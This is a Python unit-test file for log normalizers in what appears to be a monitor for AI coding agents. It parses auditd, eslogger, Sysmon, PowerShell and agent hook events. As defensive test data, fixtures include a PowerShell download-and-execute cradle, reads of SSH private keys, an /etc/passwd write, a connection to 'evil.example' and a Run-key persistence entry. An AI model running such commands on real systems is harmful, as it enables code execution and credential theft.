"""Normalizers: external tracer output -> canonical events.

These parse text produced by something else (auditd, eslogger, the Windows
event log). Malformed input is normal, not exceptional -- a normalizer that
raises takes its collector thread down and the log goes quiet, which is
precisely the failure the probe suite exists to catch. So every case here has
a "garbage in" companion.
"""

import unittest

from tests.support import windows_only


class TestCanonical(unittest.TestCase):
    def test_shape_and_none_stripping(self):
        from gm.collectors import canonical
        ev = canonical("auditd", "process.exec", pid=1, ppid=2, comm="sh",
                       exe="/bin/sh", argv=None)
        self.assertEqual(ev["src"], "auditd")
        self.assertEqual(ev["kind"], "process.exec")
        self.assertEqual(ev["pid"], 1)
        self.assertEqual(ev["data"], {"exe": "/bin/sh"},
                         "None data fields must be dropped, not stored as null")

    def test_defaults(self):
        from gm.collectors import canonical
        ev = canonical("gm", "monitor.start")
        self.assertEqual(ev["session"], "unknown")
        self.assertIsNone(ev["ppid"])
        self.assertEqual(ev["data"], {})

    def test_false_and_zero_are_kept(self):
        from gm.collectors import canonical
        ev = canonical("pwsh", "process.exec", has_b64_blob=False, port=0)
        self.assertIn("has_b64_blob", ev["data"])
        self.assertIn("port", ev["data"])


class TestHookToCanonical(unittest.TestCase):
    def to_canonical(self, payload):
        from gm.collectors import IngestServer
        return IngestServer._to_canonical(payload)

    def test_pre_and_post_map_to_kinds(self):
        self.assertEqual(self.to_canonical({"hook_event_name": "PreToolUse"})["kind"], "tool.pre")
        self.assertEqual(self.to_canonical({"hook_event_name": "PostToolUse"})["kind"], "tool.post")

    def test_other_hook_events_are_kept_as_tool_other(self):
        self.assertEqual(self.to_canonical({"hook_event_name": "SessionStart"})["kind"], "tool.other")
        self.assertEqual(self.to_canonical({})["kind"], "tool.other")

    def test_agent_pid_becomes_the_event_pid(self):
        # This is what lets gm.sessions bind the session to the process tree.
        ev = self.to_canonical({"hook_event_name": "PreToolUse", "session_id": "S",
                                "agent_pid": 4242, "hook_pid": 4243})
        self.assertEqual(ev["pid"], 4242)
        self.assertEqual(ev["data"]["agent_pid"], 4242)
        self.assertEqual(ev["data"]["hook_pid"], 4243)

    def test_tool_input_is_flattened_into_the_matchable_fields(self):
        ev = self.to_canonical({
            "hook_event_name": "PreToolUse", "session_id": "S", "tool_name": "Edit",
            "tool_input": {"file_path": "/a/b.py", "new_string": "SECRET",
                           "command": "x", "content": "c", "url": "http://h"},
        })
        d = ev["data"]
        self.assertEqual(d["tool_name"], "Edit")
        self.assertEqual(d["path"], "/a/b.py")
        self.assertEqual(d["new_string"], "SECRET")
        self.assertEqual(d["command"], "x")
        self.assertEqual(d["url"], "http://h")
        self.assertIn("raw_input", d, "the untouched payload must be retained")

    def test_notebook_path_is_used_when_file_path_is_absent(self):
        ev = self.to_canonical({"hook_event_name": "PreToolUse",
                                "tool_input": {"notebook_path": "/a/n.ipynb"}})
        self.assertEqual(ev["data"]["path"], "/a/n.ipynb")

    def test_missing_session_defaults_to_unknown(self):
        self.assertEqual(self.to_canonical({"hook_event_name": "PreToolUse"})["session"], "unknown")

    def test_null_tool_input_does_not_raise(self):
        ev = self.to_canonical({"hook_event_name": "PreToolUse", "tool_input": None})
        self.assertNotIn("path", ev["data"])


class TestAuditdNormalize(unittest.TestCase):
    def norm(self, line):
        from gm.collectors import auditd_normalize
        return list(auditd_normalize(line))

    def test_execve_record(self):
        line = ('type=SYSCALL msg=audit(1.1:1): arch=c000003e syscall=59 success=yes '
                'pid=1234 ppid=1000 uid=1001 comm="python" exe="/usr/bin/python" key="gm-exec"')
        ev, = self.norm(line)
        self.assertEqual(ev["kind"], "process.exec")
        self.assertEqual((ev["pid"], ev["ppid"], ev["uid"]), (1234, 1000, 1001))
        self.assertEqual(ev["data"]["exe"], "/usr/bin/python")

    def test_ppid_is_parsed_because_sessions_needs_it(self):
        line = 'type=SYSCALL pid=2 ppid=1 uid=0 comm="x" exe="/x" key="gm-exec"'
        self.assertEqual(self.norm(line)[0]["ppid"], 1)

    def test_file_open_vs_file_write_by_flags(self):
        ro = 'type=SYSCALL pid=1 uid=0 comm="c" name="/home/agent/.ssh/id_rsa" key="gm-file-cred"'
        self.assertEqual(self.norm(ro)[0]["kind"], "file.open")
        wo = ('type=SYSCALL a1=O_WRONLY pid=1 uid=0 comm="c" name="/etc/passwd" '
              'key="gm-file-tamper"')
        self.assertEqual(self.norm(wo)[0]["kind"], "file.write")
        rw = 'type=SYSCALL a1=O_RDWR pid=1 uid=0 comm="c" name="/x" key="gm-file"'
        self.assertEqual(self.norm(rw)[0]["kind"], "file.write")

    def test_net_connect_record(self):
        line = 'type=SYSCALL pid=1 uid=0 comm="curl" saddr=0200 key="gm-net"'
        ev, = self.norm(line)
        self.assertEqual(ev["kind"], "net.connect")
        self.assertEqual(ev["data"]["host"], "0200")

    def test_lines_without_a_gm_key_are_ignored(self):
        self.assertEqual(self.norm('type=SYSCALL pid=1 key="other-tool"'), [])
        self.assertEqual(self.norm("type=DAEMON_START ver=3.0"), [])

    def test_garbage_does_not_raise(self):
        for line in ("", "\n", "not an audit record at all",
                     'key="gm-exec"', 'pid=notanumber key="gm-exec"'):
            self.assertIsInstance(self.norm(line), list)

    def test_non_numeric_pid_becomes_none_rather_than_raising(self):
        ev, = self.norm('pid=? uid=? comm="x" exe="/x" key="gm-exec"')
        self.assertIsNone(ev["pid"])
        self.assertIsNone(ev["uid"])


class TestEsloggerNormalize(unittest.TestCase):
    def norm(self, obj):
        import json
        from gm.collectors import eslogger_normalize
        return list(eslogger_normalize(json.dumps(obj)))

    def base(self, event):
        return {"process": {"audit_token": {"pid": 501, "euid": 1001}, "ppid": 500,
                            "executable": {"path": "/bin/zsh"}},
                "event": event}

    def test_exec(self):
        ev, = self.norm(self.base({"exec": {"target": {
            "executable": {"path": "/usr/bin/python"}, "args": ["python", "x.py"]}}}))
        self.assertEqual(ev["kind"], "process.exec")
        self.assertEqual(ev["data"]["exe"], "/usr/bin/python")
        self.assertEqual(ev["data"]["argv"], ["python", "x.py"])
        self.assertEqual((ev["pid"], ev["ppid"], ev["uid"]), (501, 500, 1001))

    def test_open(self):
        ev, = self.norm(self.base({"open": {"file": {"path": "/home/agent/.ssh/id_rsa"}}}))
        self.assertEqual(ev["kind"], "file.open")
        self.assertEqual(ev["data"]["path"], "/home/agent/.ssh/id_rsa")

    def test_connect(self):
        ev, = self.norm(self.base({"connect": {"address": {"address": "1.2.3.4", "port": 443}}}))
        self.assertEqual(ev["kind"], "net.connect")
        self.assertEqual((ev["data"]["host"], ev["data"]["port"]), ("1.2.3.4", 443))

    def test_invalid_json_is_ignored(self):
        from gm.collectors import eslogger_normalize
        self.assertEqual(list(eslogger_normalize("{not json")), [])

    def test_unknown_event_type_yields_nothing(self):
        self.assertEqual(self.norm(self.base({"fork": {}})), [])

    def test_missing_nested_fields_do_not_raise(self):
        self.assertEqual(len(self.norm({"event": {"open": {}}})), 1)


class TestWindowsNormalizers(unittest.TestCase):
    """These are pure XML parsing, so they run everywhere -- no pywin32 needed."""

    NS = 'xmlns="http://schemas.microsoft.com/win/2004/08/events/event"'

    def xml(self, event_id, data, channel="Microsoft-Windows-Sysmon/Operational",
            execution_pid=None):
        rows = "".join('<Data Name="%s">%s</Data>' % (k, v) for k, v in data.items())
        exec_el = ('<Execution ProcessID="%d" ThreadID="1"/>' % execution_pid
                   if execution_pid else "")
        return ('<Event %s><System><EventID>%d</EventID><Channel>%s</Channel>%s</System>'
                '<EventData>%s</EventData></Event>'
                % (self.NS, event_id, channel, exec_el, rows))

    def sysmon(self, eid, **data):
        from gm.collectors_win import sysmon_normalize
        return list(sysmon_normalize(self.xml(eid, data)))

    def test_process_create(self):
        ev, = self.sysmon(1, ProcessId="4321", ParentProcessId="1000",
                          Image="C:\\Python\\python.exe", CommandLine="python helper.py",
                          ParentImage="C:\\bash.exe", User="HOST\\agent",
                          IntegrityLevel="Medium", Hashes="SHA256=AB")
        self.assertEqual(ev["kind"], "process.exec")
        self.assertEqual((ev["pid"], ev["ppid"]), (4321, 1000))
        self.assertEqual(ev["data"]["argv"], ["python helper.py"],
                         "Sysmon gives one command line; argv_regex joins with spaces")
        self.assertEqual(ev["session"], "unknown",
                         "Sysmon knows nothing of sessions; gm.sessions attaches it later")

    def test_network_connect_prefers_hostname(self):
        ev, = self.sysmon(3, ProcessId="1", DestinationHostname="evil.example",
                          DestinationIp="9.9.9.9", DestinationPort="443", Protocol="tcp")
        self.assertEqual(ev["data"]["host"], "evil.example")
        self.assertEqual(ev["data"]["ip"], "9.9.9.9")
        self.assertEqual(ev["data"]["port"], 443)

    def test_network_connect_falls_back_to_ip(self):
        ev, = self.sysmon(3, ProcessId="1", DestinationIp="9.9.9.9", DestinationPort="80")
        self.assertEqual(ev["data"]["host"], "9.9.9.9")

    def test_dns_query(self):
        ev, = self.sysmon(22, ProcessId="1", QueryName="gm-canary.invalid")
        self.assertEqual(ev["kind"], "net.dns")
        self.assertEqual(ev["data"]["host"], "gm-canary.invalid")

    def test_file_create_and_delete(self):
        self.assertEqual(self.sysmon(11, ProcessId="1", TargetFilename="C:\\a")[0]["kind"],
                         "file.write")
        for eid in (23, 26):
            self.assertEqual(self.sysmon(eid, ProcessId="1", TargetFilename="C:\\a")[0]["kind"],
                             "file.unlink")

    def test_registry_events(self):
        for eid in (12, 13, 14):
            ev, = self.sysmon(eid, ProcessId="1",
                              TargetObject="HKLM\\Software\\Run\\x", Details="c:\\evil.exe")
            self.assertEqual(ev["kind"], "registry.write")
            self.assertEqual(ev["data"]["path"], "HKLM\\Software\\Run\\x")

    def test_unmapped_event_id_yields_nothing(self):
        self.assertEqual(self.sysmon(7, ProcessId="1"), [])

    def test_security_4663_read_and_write_masks(self):
        from gm.collectors_win import security_normalize
        read = list(security_normalize(self.xml(
            4663, {"ObjectName": "C:\\Users\\agent\\.ssh\\id_rsa", "AccessMask": "0x1",
                   "ProcessId": "0x4d2", "ProcessName": "C:\\python.exe"},
            channel="Security")))
        self.assertEqual(read[0]["kind"], "file.read")
        self.assertEqual(read[0]["pid"], 1234, "4663 renders ProcessId in hex")

        write = list(security_normalize(self.xml(
            4663, {"ObjectName": "C:\\x", "AccessMask": "0x2", "ProcessId": "0x1"},
            channel="Security")))
        self.assertEqual(write[0]["kind"], "file.write")

    def test_security_4663_decimal_mask_is_accepted(self):
        from gm.collectors_win import security_normalize
        ev, = list(security_normalize(self.xml(
            4663, {"ObjectName": "C:\\x", "AccessMask": "1", "ProcessId": "5"},
            channel="Security")))
        self.assertEqual(ev["kind"], "file.read")

    def test_security_4663_without_object_or_mask_is_dropped(self):
        from gm.collectors_win import security_normalize
        self.assertEqual(list(security_normalize(self.xml(
            4663, {"AccessMask": "0x1"}, channel="Security"))), [])
        self.assertEqual(list(security_normalize(self.xml(
            4663, {"ObjectName": "C:\\x"}, channel="Security"))), [])

    def test_wrong_event_id_is_rejected_by_each_normalizer(self):
        from gm.collectors_win import security_normalize, powershell_normalize
        self.assertEqual(list(security_normalize(self.xml(4624, {}, channel="Security"))), [])
        self.assertEqual(list(powershell_normalize(self.xml(4103, {}))), [])

    def test_powershell_4104(self):
        from gm.collectors_win import powershell_normalize
        ev, = list(powershell_normalize(self.xml(
            4104, {"ScriptBlockText": "iex (New-Object Net.WebClient).DownloadString('u')",
                   "ScriptBlockId": "abc", "MessageNumber": "1", "MessageTotal": "2",
                   "Path": "C:\\s.ps1"},
            channel="Microsoft-Windows-PowerShell/Operational", execution_pid=7788)))
        self.assertEqual(ev["kind"], "process.exec")
        self.assertEqual(ev["pid"], 7788, "4104 has no EventData pid; System/Execution supplies it")
        self.assertEqual(ev["data"]["exe"], "powershell.exe")
        self.assertEqual(ev["data"]["part"], "1/2",
                         "long scripts split across events; the parts must be visible")
        self.assertFalse(ev["data"]["has_b64_blob"])

    def test_powershell_flags_a_long_base64_blob(self):
        from gm.collectors_win import powershell_normalize
        blob = "A" * 130
        ev, = list(powershell_normalize(self.xml(
            4104, {"ScriptBlockText": "$x = '%s'" % blob},
            channel="Microsoft-Windows-PowerShell/Operational", execution_pid=1)))
        self.assertTrue(ev["data"]["has_b64_blob"])

    def test_event_without_an_execution_element_still_parses(self):
        from gm.collectors_win import powershell_normalize
        ev, = list(powershell_normalize(self.xml(
            4104, {"ScriptBlockText": "x"},
            channel="Microsoft-Windows-PowerShell/Operational")))
        self.assertIsNone(ev["pid"])

    def test_malformed_xml_raises_where_the_caller_catches_it(self):
        # EventLogCollector._callback wraps the normalizer in try/except so a
        # bad event cannot kill the subscription. Pin that the parse error is
        # an ordinary exception and not something that escapes as SystemExit.
        import xml.etree.ElementTree as ET
        from gm.collectors_win import sysmon_normalize
        with self.assertRaises(ET.ParseError):
            list(sysmon_normalize("<Event><unclosed>"))

    def test_int_helper(self):
        from gm.collectors_win import _int
        self.assertEqual(_int("42"), 42)
        self.assertIsNone(_int(None))
        self.assertIsNone(_int("not a number"))


@windows_only
class TestWindowsWiring(unittest.TestCase):
    def test_collector_thread_names_are_unique_and_documented(self):
        from gm import collectors_win as W
        names = [W.EventLogCollector(ch, "", W.sysmon_normalize, lambda e: None).name
                 for ch in (W.SYSMON_CHANNEL, W.PWSH_CHANNEL, W.SECURITY_CHANNEL)]
        self.assertEqual(len(set(names)), 3, "collector names collided: %r" % names)

    def test_explicit_names_win(self):
        from gm import collectors_win as W
        c = W.EventLogCollector(W.SYSMON_CHANNEL, "", W.sysmon_normalize,
                                lambda e: None, name="gm-sysmon")
        self.assertEqual(c.name, "gm-sysmon",
                         "gm.monitor treats exactly this name as the kernel-level source")

    def test_pipe_name_matches_the_hook(self):
        import sys
        from pathlib import Path
        from gm import collectors_win as W
        sys.path.insert(0, str(Path(W.__file__).resolve().parent.parent / "hooks"))
        import gm_hook
        self.assertEqual(W.PIPE_NAME, gm_hook.PIPE,
                         "the two halves of the transport must agree")


if __name__ == "__main__":
    unittest.main()
